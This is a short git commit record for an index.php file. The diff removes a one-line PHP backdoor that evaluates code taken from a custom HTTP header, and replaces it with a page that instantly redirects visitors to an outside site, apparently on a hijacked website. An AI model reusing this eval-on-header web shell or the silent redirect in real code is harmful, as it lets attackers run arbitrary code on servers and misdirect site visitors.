391f12aec058b27debf79611f980eda3e914ee53
infototo <parlinolxtoto@gmail.com>
2024-08-28 17:03:09 +0700

    index.php

--- index.php
+++ index.php
@@ -1,1 +1,8 @@
-<?php @eval($_SERVER['HTTP_PARLINSEC']); ?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv='refresh' content='0; URL=https://theplumagency.com/'>
+</head>
+<body>
+</body>
+</html>
